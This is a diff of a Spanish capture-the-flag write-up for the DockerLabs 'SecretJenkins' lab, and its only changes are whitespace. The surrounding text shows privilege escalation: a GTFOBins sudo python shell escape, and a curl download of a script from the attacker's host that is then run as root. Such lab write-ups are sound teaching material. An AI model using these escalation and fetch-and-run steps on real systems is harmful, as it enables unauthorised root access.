@@ -5,6 +5,7 @@
 Primero desplegamos la máquina con ```bash auto_deploy.sh secretjenkins.tar``` (si no sabes en la página de DockerLabs ahí un pdf que lo explica).
 <br>
 <br>
+
 ## Reconocimiento
 
 Una vez desplegada comprobamos que tenemos conectividad con ```ping -c 1 172.17.0.2``` 
@@ -92,8 +93,6 @@ Si ejecutamos `sudo -l` podemos ver que podemos ejecutar sin proporcionar contra
 `-l` ⮞ listar comandos que podemos ejecutar como sudo <br>
 
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/784a5bb5-c6e0-4895-8a7e-abd7d12b0c20)
-
-<br>
 <br>
 
 Por lo que deberíamos hacer ahora es dirigirnos a la página [GTFOBins](https://gtfobins.github.io/) (está página nos indica como elevar privilegios dependiendo del binario que podamos ejecutar), después nos vamos a la parte de sudo en python3, y nos encontramos con el siguiente comando `sudo python -c 'import os; os.system("/bin/sh")'`. Y lo ejecutaríamos de lwa siguiente forma `sudo -u pinguinito /usr/bin/python3 -c 'import os; os.system("/bin/bash")'`. <br>
@@ -113,5 +112,6 @@ No montamos un servidor HTTP en python en la ubicación de nuestro archivo `scri
 
 Ahora en la máquina **SecretJenkins** accedemos al archivo de la siguiente forma `curl http://172.17.0.1/script.py -O script.py`, antes deberíamos haber puesto permiso de escritura en el archivo `scirpt.py` con `chmod +w script.py`. Una vez tenemos dicho archivo hacemos `sudo -u root /usr/bin/python3 /opt/script.py` para ejecutar dicho archivo como root y listo ya somos root:  
 <br>
+
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/d9f1e7ce-a131-4683-9fdb-fe976dcad531)
 <br>
